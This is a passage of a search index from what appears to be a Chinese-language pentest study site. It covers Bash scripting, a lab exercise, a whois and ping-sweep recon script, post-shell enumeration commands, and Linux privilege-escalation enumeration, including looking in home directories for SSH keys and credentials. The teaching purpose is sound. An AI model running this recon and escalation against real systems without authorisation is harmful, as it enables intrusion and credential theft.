to)\"\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_10","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<p>\u4f7f\u7528\u903b\u8f91\u8fd0\u7b97\u7b26\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e00\u4e2a\u4e2d\u5b9a\u4e49\u591a\u4e2a\u6761\u4ef6\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5b9a\u4e49\u7684\u6240\u6709\u6761\u4ef6\u90fd\u5fc5\u987b\u5339\u914d\uff0c\u7136\u540e\u624d\u80fd\u6267\u884c\u76f8\u5e94\u7684\u4ee3\u7801\u3002 Operator | \u63cf\u8ff0 --- | --- <code>!</code> |\u903b\u8f91\u534f\u5546NOT <code>&amp;&amp;</code> | \u903b\u8f91\u4e0e <code>||</code> | \u903b\u8f91\u6216</p> <pre><code>#!/bin/bash\n\n# Check if the specified file exists and if we have read permissions\nif [[ -e \"$1\" &amp;&amp; -r \"$1\" ]]\nthen\n    echo -e \"We can read the file that has been specified.\"\n    exit 0\n\nelif [[ ! -e \"$1\" ]]\nthen\n    echo -e \"The specified file does not exist.\"\n    exit 2\n\nelif [[ -e \"$1\" &amp;&amp; ! -r \"$1\" ]]\nthen\n    echo -e \"We don't have read permission for this file.\"\n    exit 1\n\nelse\n    echo -e \"Error occured.\"\n    exit 5\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_11","title":"\u7ec3\u4e60\u811a\u672c","text":"<pre><code>#!/bin/bash\n\nvar=\"8dm7KsjU28B7v621Jls\"\nvalue=\"ERmFRMVZ0U2paTlJYTkxDZz09Cg\"\n\nfor i in {1..40}\ndo\n        var=$(echo $var | base64)\n\n        #&lt;---- If condition here:\ndone\n</code></pre> <p>\u5728\u201cFor\u201d\u5faa\u73af\u4e2d\u521b\u5efa\u4e00\u4e2a\u201cIf-Else\u201d\u6761\u4ef6\uff0c\u68c0\u67e5\u540d\u4e3a\u201cvar\u201d\u7684\u53d8\u91cf\u662f\u5426\u5305\u542b\u540d\u4e3a\u201cvalue\u201d\u7684\u53d8\u91cf\u7684\u5185\u5bb9\u3002\u6b64\u5916\uff0c\u53d8\u91cf\u201cvar\u201d\u5fc5\u987b\u5305\u542b\u8d85\u8fc7 113,450 \u4e2a\u5b57\u7b26\u3002\u5982\u679c\u6ee1\u8db3\u8fd9\u4e9b\u6761\u4ef6\uff0c\u5219\u811a\u672c\u5fc5\u987b\u6253\u5370\u53d8\u91cf\u201cvar\u201d\u7684\u6700\u540e 20 \u4e2a\u5b57\u7b26\u3002\u63d0\u4ea4\u6700\u540e 20 \u4e2a\u5b57\u7b26\u4f5c\u4e3a\u7b54\u6848\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_12","title":"\u7b97\u6570","text":"<p>\u5728 Bash \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e03\u79cd\u4e0d\u540c<code>arithmetic operators</code>\u7684\u65b9\u6cd5\u3002\u8fd9\u4e9b\u7528\u4e8e\u6267\u884c\u4e0d\u540c\u7684\u6570\u5b66\u8fd0\u7b97\u6216\u4fee\u6539\u67d0\u4e9b\u6574\u6570\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_13","title":"\u7b97\u6570\u8fd0\u7b97\u7b26","text":"<p>Operator | \u63cf\u8ff0 | --- | --- | <code>+</code> | \u6dfb\u52a0 <code>-</code> | \u51cf\u6cd5 <code>*</code> | \u4e58\u6cd5 <code>/</code> | \u5206\u914d <code>%</code> | \u6a21\u6570 <code>variable++</code> | \u5c06\u53d8\u91cf\u7684\u503c\u589e\u52a0 1 <code>variable--</code> | \u5c06\u53d8\u91cf\u7684\u503c\u51cf 1 \u6211\u4eec\u53ef\u4ee5\u5728\u4e00\u4e2a\u5c0f\u811a\u672c\u4e2d\u603b\u7ed3\u6240\u6709\u8fd9\u4e9b\u8fd0\u7b97\u7b26\uff1a</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#arithmeticsh","title":"Arithmetic.sh","text":"<pre><code>#!/bin/bash\n\nincrease=1\ndecrease=1\n\necho \"Addition: 10 + 10 = $((10 + 10))\"\necho \"Substraction: 10 - 10 = $((10 - 10))\"\necho \"Multiplication: 10 * 10 = $((10 * 10))\"\necho \"Division: 10 / 10 = $((10 / 10))\"\necho \"Modulus: 10 % 4 = $((10 % 4))\"\n\n((increase++))\necho \"Increase Variable: $increase\"\n\n((decrease--))\necho \"Decrease Variable: $decrease\"\n</code></pre> <p>\u6b64\u811a\u672c\u7684\u8f93\u51fa\u5982\u4e0b\u6240\u793a\uff1a</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#arithmeticsh-","title":"Arithmetic.sh - \u6267\u884c","text":"<pre><code>darkinga@htb[/htb]$ ./Arithmetic.sh\n\nAddition: 10 + 10 = 20\nSubstraction: 10 - 10 = 0\nMultiplication: 10 * 10 = 100\nDivision: 10 / 10 = 1\nModulus: 10 % 4 = 2\nIncrease Variable: 2\nDecrease Variable: 0\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u8ba1\u7b97\u53d8\u91cf\u7684\u957f\u5ea6\u3002\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570<code>${#variable}</code>\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u88ab\u8ba1\u6570\uff0c\u6211\u4eec\u5f97\u5230\u53d8\u91cf\u4e2d\u7684\u5b57\u7b26\u603b\u6570\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#varlengthsh","title":"VarLength.sh","text":"<pre><code>#!/bin/bash\n\nhtb=\"HackTheBox\"\n\necho ${#htb}\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#varlengthsh_1","title":"VarLength.sh","text":"<pre><code>$ ./VarLength.sh\n\n10\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u67e5\u770b\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u6211\u4eec\u5df2\u7ecf\u591a\u6b21\u4f7f\u7528\u4e86<code>increase</code>and<code>decrease</code>\u8fd0\u7b97\u7b26\u3002\u8fd9\u786e\u4fdd\u4e86\u6211\u4eec\u7a0d\u540e\u5c06\u8ba8\u8bba\u7684 while \u5faa\u73af\u8fd0\u884c\u5e76 ping \u4e3b\u673a\uff0c\u800c\u53d8\u91cf \"\u00a0<code>stat</code>\" \u7684\u503c\u4e3a<code>1</code>.\u00a0\u5982\u679c ping \u547d\u4ee4\u4ee5\u4ee3\u7801\u7ed3\u5c3e<code>0</code>\uff08\u6210\u529f\uff09\uff0c\u6211\u4eec\u4f1a\u6536\u5230\u4e00\u6761\u6d88\u606f\uff0c\u8868\u660e\u53d8\u91cf<code>host is up</code>\u548c\"\u00a0<code>stat</code>\" \u4ee5\u53ca\u53d8\u91cf \"\u00a0<code>hosts_up</code>\" \u548c \"\u00a0<code>hosts_total</code>\" \u5df2\u66f4\u6539\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#cidrsh_1","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n    echo -e \"\\nPinging host(s):\"\n    for host in $cidr_ips\n    do\n        stat=1\n        while [ $stat -eq 1 ]\n        do\n            ping -c 2 $host &gt; /dev/null 2&gt;&amp;1\n            if [ $? -eq 0 ]\n            then\n                echo \"$host is up.\"\n                ((stat--))\n                ((hosts_up++))\n                ((hosts_total++))\n            else\n                echo \"$host is down.\"\n                ((stat--))\n                ((hosts_total++))\n            fi\n        done\n    done\n&lt;SNIP&gt;\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#bash","title":"bash","text":""},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E7%AE%80%E4%BB%8B/","title":"Bash\u811a\u672c\u7b80\u4ecb","text":"<pre><code>\u672c\u6a21\u5757\u6db5\u76d6\u4e86\u4f7f\u7528 Bash \u811a\u672c\u5728 Linux \u7cfb\u7edf\u4e0a\u81ea\u52a8\u6267\u884c\u4efb\u52a1\u6240\u9700\u7684\u57fa\u7840\u77e5\u8bc6\u3002\u5bf9\u4e8e\u4ece\u4e8b\u6280\u672f\u4fe1\u606f\u5b89\u5168\u5de5\u4f5c\u7684\u4efb\u4f55\u4eba\u6765\u8bf4\uff0c\u624e\u5b9e\u638c\u63e1 Bash \u662f\u4e00\u9879\u57fa\u672c\u6280\u80fd\u3002\u901a\u8fc7\u81ea\u52a8\u5316\u7684\u529b\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u91ca\u653e Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u5168\u90e8\u6f5c\u529b\u5e76\u9ad8\u6548\u5730\u6267\u884c\u4e60\u60ef\u6027\u4efb\u52a1\u3002\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E7%AE%80%E4%BB%8B/#bourne-again-shell","title":"Bourne Again Shell","text":"<p>Bash\u662f\u6211\u4eec\u7528\u6765\u4e0e\u57fa\u4e8e Unix \u7684\u64cd\u4f5c\u7cfb\u7edf\u901a\u4fe1\u5e76\u5411\u7cfb\u7edf\u53d1\u51fa\u547d\u4ee4\u7684\u811a\u672c\u8bed\u8a00\u3002\u81ea 2019 \u5e74 5 \u6708\u8d77\uff0cWindows \u63d0\u4f9b\u4e86\u9002\u7528\u4e8e Linux \u7684 Windows \u5b50\u7cfb\u7edf\uff0c\u5141\u8bb8\u6211\u4eec<code>Bash</code>\u5728 Windows \u73af\u5883\u4e2d\u4f7f\u7528\u3002\u638c\u63e1\u8bed\u8a00\u4ee5\u6709\u6548\u5730\u4f7f\u7528\u5b83\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u811a\u672c\u548c\u7f16\u7a0b\u8bed\u8a00\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u4e0e\u7f16\u7a0b\u8bed\u8a00\u76f8\u53cd\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u7f16\u8bd1\u4ee3\u7801\u6765\u6267\u884c\u811a\u672c\u8bed\u8a00\u3002</p> <p>\u4f5c\u4e3a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\uff0c\u6211\u4eec\u5fc5\u987b\u80fd\u591f\u4f7f\u7528\u4efb\u4f55\u64cd\u4f5c\u7cfb\u7edf\uff0c\u65e0\u8bba\u662f\u57fa\u4e8e Windows \u8fd8\u662f\u57fa\u4e8e Unix\u3002\u6548\u7387\u4e3b\u8981\u53d6\u51b3\u4e8e\u7cfb\u7edf\u7684\u77e5\u8bc6\uff0c\u5c24\u5176\u662f\u5728\u6743\u9650\u63d0\u5347\u9886\u57df\u3002\u5728\u57fa\u4e8e Unix \u7684\u7cfb\u7edf\u4e0a\uff0c\u5fc5\u987b\u5b66\u4e60\u5982\u4f55\u4f7f\u7528\u7ec8\u7aef\u3001\u8fc7\u6ee4\u6570\u636e\u548c\u81ea\u52a8\u5316\u8fd9\u4e9b\u8fc7\u7a0b\u3002\u5c24\u5176\u662f\u5728\u57fa\u4e8e Unix \u7684\u5927\u578b\u4f01\u4e1a\u7f51\u7edc\u4e2d\uff0c\u6211\u4eec\u5c06\u4e0d\u5f97\u4e0d\u5904\u7406\u5927\u91cf\u6570\u636e\u3002\u6211\u4eec\u5fc5\u987b\u76f8\u5e94\u5730\u8fdb\u884c\u5206\u7c7b\u548c\u8fc7\u6ee4\uff0c\u4ee5\u5c3d\u5feb\u786e\u5b9a\u6f5c\u5728\u7684\u5dee\u8ddd\u548c\u4fe1\u606f\u3002</p> <p>\u5b66\u4e60\u5982\u4f55\u7ec4\u5408\u591a\u4e2a\u547d\u4ee4\u5e76\u5904\u7406\u5355\u4e2a\u7ed3\u679c\u4e5f\u5f88\u91cd\u8981\u3002\u8fd9\u5c31\u662f\u811a\u672c\u7684\u7528\u6b66\u4e4b\u5730\uff0c\u63d0\u9ad8\u4e86\u6211\u4eec\u7684\u901f\u5ea6\u548c\u6548\u7387\u3002\u4e0e\u7f16\u7a0b\u8bed\u8a00\u4e00\u6837\uff0c\u811a\u672c\u8bed\u8a00\u5177\u6709\u51e0\u4e4e\u76f8\u540c\u7684\u7ed3\u6784\uff0c\u53ef\u5206\u4e3a\uff1a - <code>Input&amp;Output</code> - <code>Arguments, Variables&amp;Arrays</code> - <code>Conditional execution</code> - <code>Arithmetic</code> - <code>Loops</code> - <code>Comparison operators</code> - <code>Functions</code></p> <p>\u811a\u672c\u4e3b\u8981\u7528\u6765\u81ea\u52a8\u5316\u4e00\u4e9b\u6d41\u7a0b\uff0c\u800c\u4e0d\u662f\u4e00\u76f4\u624b\u5de5\u505a\u91cd\u590d\u5de5\u4f5c\u3002\u8fd8\u53ef\u4ee5\u5904\u7406\u5e76\u8fc7\u6ee4\u5927\u91cf\u7684\u4fe1\u606f\u3002\u6267\u884c\u793a\u4f8b\uff1a</p> <pre><code>$ bash script.sh &lt;optional arguments&gt;\n\n$ sh script.sh &lt;optional arguments&gt;\n\n$ ./script.sh &lt;optional arguments&gt;\n</code></pre> <p>\u641e\u6e05\u695a\u4e0b\u9762\u8fd9\u4e2a\u811a\u672c\uff0c\u5982\u4f55\u521b\u5efa\u5b83\u4eec\u4ee5\u83b7\u5f97\u7279\u5b9a\u7684\u7ed3\u679c\u3002\u6267\u884c\u811a\u672c\u5e76\u6307\u5b9a\u4e00\u4e2a\u57df\uff0c\u4f1a\u770b\u5230\u811a\u672c\u63d0\u4f9b\u7684\u4fe1\u606f\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E7%AE%80%E4%BB%8B/#cidrsh","title":"CIDR.sh","text":"<pre><code>$ ./CIDR.sh inlanefreight.com\n\nDiscovered IP address(es):\n165.22.119.202\n\nAdditional options available:\n    1) Identify the corresponding network range of target domain.\n    2) Ping discovered hosts.\n    3) All checks.\n    *) Exit.\n\nSelect your option: 3\n\nNetRange for 165.22.119.202:\nNetRange:       165.22.0.0 - 165.22.255.255\nCIDR:           165.22.0.0/16\n\nPinging host(s):\n165.22.119.202 is up.\n\n1 out of 1 hosts are up.\n</code></pre> <p>\u8be6\u7ec6\u67e5\u770b\u8be5\u811a\u672c\uff0c\u5e76\u4ee5\u6700\u597d\u7684\u65b9\u5f0f(way)\u9010\u884c\u9605\u8bfb\u3002\u67e5\u770b\u5e76\u5206\u6790\u6b21\u811a\u672c\u6240\u6709\u90e8\u5206\uff1a</p> <pre><code>#!/bin/bash\n\n# Check for given arguments\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n\n# Identify Network range for the specified IP address(es)\nfunction network_range {\n    for ip in $ipaddr\n    do\n        netrange=$(whois $ip | grep \"NetRange\\|CIDR\" | tee -a CIDR.txt)\n        cidr=$(whois $ip | grep \"CIDR\" | awk '{print $2}')\n        cidr_ips=$(prips $cidr)\n        echo -e \"\\nNetRange for $ip:\"\n        echo -e \"$netrange\"\n    done\n}\n\n# Ping discovered IP address(es)\nfunction ping_host {\n    hosts_up=0\n    hosts_total=0\n\n    echo -e \"\\nPinging host(s):\"\n    for host in $cidr_ips\n    do\n        stat=1\n        while [ $stat -eq 1 ]\n        do\n            ping -c 2 $host &gt; /dev/null 2&gt;&amp;1\n            if [ $? -eq 0 ]\n            then\n                echo \"$host is up.\"\n                ((stat--))\n                ((hosts_up++))\n                ((hosts_total++))\n            else\n                echo \"$host is down.\"\n                ((stat--))\n                ((hosts_total++))\n            fi\n        done\n    done\n\n    echo -e \"\\n$hosts_up out of $hosts_total hosts are up.\"\n}\n\n# Identify IP address of the specified domain\nhosts=$(host $domain | grep \"has address\" | cut -d\" \" -f4 | tee discovered_hosts.txt)\n\necho -e \"Discovered IP address:\\n$hosts\\n\"\nipaddr=$(host $domain | grep \"has address\" | cut -d\" \" -f4 | tr \"\\n\" \" \")\n\n# Available options\necho -e \"Additional options available:\"\necho -e \"\\t1) Identify the corresponding network range of target domain.\"\necho -e \"\\t2) Ping discovered hosts.\"\necho -e \"\\t3) All checks.\"\necho -e \"\\t*) Exit.\\n\"\n\nread -p \"Select your option: \" opt\n\ncase $opt in\n    \"1\") network_range ;;\n    \"2\") ping_host ;;\n    \"3\") network_range &amp;&amp; ping_host ;;\n    \"*\") exit 0 ;;\nesac\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u6211\u4eec\u5728\u8fd9\u91cc\u6ce8\u91ca\u4e86\u811a\u672c\u7684\u51e0\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u62c6\u5206\u6210\u51e0\u4e2a\u90e8\u5206\u3002</p> <ol> <li> <p>\u68c0\u67e5\u7ed9\u5b9a\u7684\u53c2\u6570(Check for given arguments) \u5728\u811a\u672c\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u6709\u4e00\u4e2a if-else \u8bed\u53e5\uff0c\u7528\u4e8e\u68c0\u67e5\u6211\u4eec\u662f\u5426\u6307\u5b9a\u4e86\u4ee3\u8868\u76ee\u6807\u516c\u53f8\u7684\u57df\u3002</p> </li> <li> <p>\u8bc6\u522b\u6307\u5b9a IP \u5730\u5740\u7684\u7f51\u7edc\u8303\u56f4(Identify network range for the specified IP address(es)) \u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u5bf9\u6bcf\u4e2a IP \u5730\u5740\u8fdb\u884c\u201cwhois\u201d\u67e5\u8be2\uff0c\u5e76\u663e\u793a\u4fdd\u7559\u7f51\u7edc\u8303\u56f4\u7684\u884c\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5728 CIDR.txt \u4e2d\u3002</p> </li> <li> <p>Ping \u53d1\u73b0\u7684 IP \u5730\u5740(Ping discovered IP address(es)) \u6b64\u9644\u52a0\u529f\u80fd\u7528\u4e8e\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4f7f\u7528\u76f8\u5e94\u7684 IP \u5730\u5740\u8bbf\u95ee\u627e\u5230\u7684\u4e3b\u673a\u3002\u4f7f\u7528 For-Loop\uff0c\u6211\u4eec ping \u7f51\u7edc\u8303\u56f4\u5185\u7684\u6bcf\u4e2a IP \u5730\u5740\u5e76\u8ba1\u7b97\u7ed3\u679c\u3002</p> </li> <li> <p>\u8bc6\u522b\u6307\u5b9a\u57df\u7684 IP \u5730\u5740(Identify IP address(es) of the specified domain) \u4f5c\u4e3a\u6b64\u811a\u672c\u7684\u7b2c\u4e00\u6b65\uff0c\u6211\u4eec\u786e\u5b9a\u8fd4\u56de\u7ed9\u6211\u4eec\u7684\u57df\u7684 IPv4 \u5730\u5740\u3002</p> </li> <li> <p>\u53ef\u7528\u9009\u9879(Available options) \u7136\u540e\u6211\u4eec\u51b3\u5b9a\u8981\u4f7f\u7528\u54ea\u4e9b\u529f\u80fd\u6765\u67e5\u627e\u6709\u5173\u57fa\u7840\u67b6\u6784\u7684\u66f4\u591a\u4fe1\u606f\u3002</p> </li> </ol>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E7%AE%80%E4%BB%8B/#bash","title":"bash","text":""},{"location":"Linux/Linux%20Get%20Shell%20%E5%90%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"Linux Get Shell \u540e\u4fe1\u606f\u6536\u96c6","text":"<p>Linux Get Shell \u540e\u4fe1\u606f\u6536\u96c6 <code>uname -a</code> <code>cat /proc/cpuinfo | grep name | head -n 1 | awk \u2018{print $4,$5,$6,$7,$8,$9;}\u2019</code> <code>free -m | grep Mem | awk \u2018{print $2 ,$3, $4, $5, $6, $7}\u2019</code> <code>ls -lh $(which ls)</code> <code>which ls</code> <code>crontab -l</code> <code>cat /proc/cpuinfo | grep model | grep name | wc -l</code> <code>top</code></p>"},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","title":"Linux \u6743\u9650\u63d0\u5347","text":""},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#linux","title":"Linux \u63d0\u6743\u7b80\u4ecb","text":""},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_1","title":"\u679a\u4e3e","text":"<p>\u679a\u4e3e\u662f\u63d0\u6743\u7684\u5173\u952e\u3002\u5b58\u5728\u51e0\u4e2a\u5e2e\u52a9\u7a0b\u5e8f\u811a\u672c\uff08\u4f8b\u5982LinEnum\uff09\u6765\u5e2e\u52a9\u679a\u4e3e\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u4e86\u89e3\u8981\u67e5\u627e\u7684\u4fe1\u606f\u4ee5\u53ca\u80fd\u591f\u624b\u52a8\u6267\u884c\u679a\u4e3e\u4e5f\u5f88\u91cd\u8981\u3002\u5f53\u60a8\u83b7\u5f97\u5bf9\u4e3b\u673a\u7684\u521d\u59cb shell \u8bbf\u95ee\u6743\u9650\u65f6\uff0c\u68c0\u67e5\u51e0\u4e2a\u5173\u952e\u7ec6\u8282\u5f88\u91cd\u8981\u3002</p> <p><code>\u7cfb\u7edf\u7248\u672c</code>\uff1a \u4e86\u89e3\u53d1\u884c\u7248\uff08Ubuntu\u3001Debian\u3001FreeBSD\u3001Fedora\u3001SUSE\u3001Red Hat\u3001CentOS \u7b49\uff09\u5c06\u4f7f\u60a8\u4e86\u89e3\u53ef\u80fd\u53ef\u7528\u7684\u5de5\u5177\u7c7b\u578b\u3002\u8fd9\u4e5f\u5c06\u8bc6\u522b\u53ef\u80fd\u5b58\u5728\u516c\u5171\u6f0f\u6d1e\u7684\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u3002</p> <p><code>\u5185\u6838\u7248\u672c</code>\uff1a\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u4e00\u6837\uff0c\u53ef\u80fd\u5b58\u5728\u9488\u5bf9\u7279\u5b9a\u5185\u6838\u7248\u672c\u4e2d\u7684\u6f0f\u6d1e\u7684\u516c\u5171\u6f0f\u6d1e\u5229\u7528\u3002\u5185\u6838\u6f0f\u6d1e\u5229\u7528\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u751a\u81f3\u5b8c\u5168\u5d29\u6e83\u3002\u5c0f\u5fc3\u5728\u4efb\u4f55\u751f\u4ea7\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fd9\u4e9b\uff0c\u5e76\u786e\u4fdd\u5728\u8fd0\u884c\u4e4b\u524d\u5b8c\u5168\u4e86\u89e3\u6f0f\u6d1e\u5229\u7528\u548c\u53ef\u80fd\u7684\u540e\u679c\u3002</p> <p><code>\u8fd0\u884c\u670d\u52a1</code>\uff1a \u4e86\u89e3\u4e3b\u673a\u4e0a\u6b63\u5728\u8fd0\u884c\u54ea\u4e9b\u670d\u52a1\u5f88\u91cd\u8981\uff0c\u5c24\u5176\u662f\u90a3\u4e9b\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u7684\u670d\u52a1\u3002\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u7684\u914d\u7f6e\u9519\u8bef\u6216\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5f88\u5bb9\u6613\u83b7\u5f97\u6743\u9650\u63d0\u5347\u3002\u5728\u8bb8\u591a\u5e38\u89c1\u670d\u52a1\u4e2d\u53d1\u73b0\u4e86\u7f3a\u9677\uff0c\u4f8b\u5982 Nagios\u3001Exim\u3001Samba\u3001ProFTPd \u7b49\u3002\u5176\u4e2d\u8bb8\u591a\u5b58\u5728\u516c\u5171\u6f0f\u6d1e\u5229\u7528 PoC\uff0c\u4f8b\u5982 CVE-2016-9566\uff0c\u8fd9\u662f Nagios Core &lt; 4.2.4 \u4e2d\u7684\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u3002</p>"},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_2","title":"\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b","text":"<pre><code>$ ps aux | grep root\n\nroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init\nroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]\nroot         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]\nroot         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]\nroot         5  0.0  0.0      0     0 ?        S&lt;   23:26   0:00 [kworker/0:0H]\nroot         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]\nroot         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]\nroot         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]\nroot         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]\n\n&lt;SNIP&gt;\n</code></pre> <p><code>Installed Packages and Versions</code>\uff1a\u4e0e\u8fd0\u884c\u670d\u52a1\u4e00\u6837\uff0c\u91cd\u8981\u7684\u662f\u8981\u68c0\u67e5\u662f\u5426\u6709\u4efb\u4f55\u53ef\u80fd\u5f88\u5bb9\u6613\u88ab\u7528\u6765\u63d0\u5347\u6743\u9650\u7684\u8fc7\u65f6\u6216\u6613\u53d7\u653b\u51fb\u7684\u5305\u3002\u4e00\u4e2a\u4f8b\u5b50\u662f Screen\uff0c\u5b83\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u7ec8\u7aef\u591a\u8def\u590d\u7528\u5668\uff08\u7c7b\u4f3c\u4e8e tmux\uff09\u3002\u5b83\u5141\u8bb8\u60a8\u542f\u52a8\u4e00\u4e2a\u4f1a\u8bdd\u5e76\u6253\u5f00\u591a\u4e2a\u7a97\u53e3\u6216\u865a\u62df\u7ec8\u7aef\uff0c\u800c\u4e0d\u662f\u6253\u5f00\u591a\u4e2a\u7ec8\u7aef\u4f1a\u8bdd\u3002Screen \u7248\u672c 4.05.00 \u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8f7b\u677e\u5229\u7528\u8be5\u6f0f\u6d1e\u63d0\u6743\u3002</p> <p><code>Logged in Users</code>\uff1a\u4e86\u89e3\u54ea\u4e9b\u5176\u4ed6\u7528\u6237\u5df2\u767b\u5f55\u7cfb\u7edf\u4ee5\u53ca\u4ed6\u4eec\u5728\u505a\u4ec0\u4e48\u53ef\u4ee5\u66f4\u597d\u5730\u4e86\u89e3\u53ef\u80fd\u7684\u672c\u5730\u6a2a\u5411\u79fb\u52a8\u548c\u7279\u6743\u5347\u7ea7\u8def\u5f84\u3002</p>"},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_3","title":"\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b","text":"<pre><code>$ ps au\n\nUSER            PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot            1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --\ncliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash\nshared          1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash\nroot            1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su\nroot            1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su\nroot            1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash\nshared          1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au\n</code></pre> <p><code>User Home Directories</code>: \u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u5176\u4ed6\u7528\u6237\u7684\u4e3b\u76ee\u5f55\uff1f\u7528\u6237\u4e3b\u6587\u4ef6\u5939\u8fd8\u53ef\u80fd\u5305\u542b SSH \u5bc6\u94a5\uff0c\u53ef\u7528\u4e8e\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u6216\u5305\u542b\u51ed\u636e\u7684\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u3002\u627e\u5230\u5305\u542b\u53ef\u7528\u4e8e\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u751a\u81f3\u8fdb\u5165 Active Directory \u73af\u5883\u7684\u51ed\u636e\u7684\u6587\u4ef6\u5e76\u4e0d\u5c11\u89c1\u3002</p>"},{"location":"Linux/Linux%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_4","title":"\u4e3b\u76ee\u5f55\u5185\u5bb9","text":"<pre><code>darkinga@htb[/htb]$ ls /home\n\nbackupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  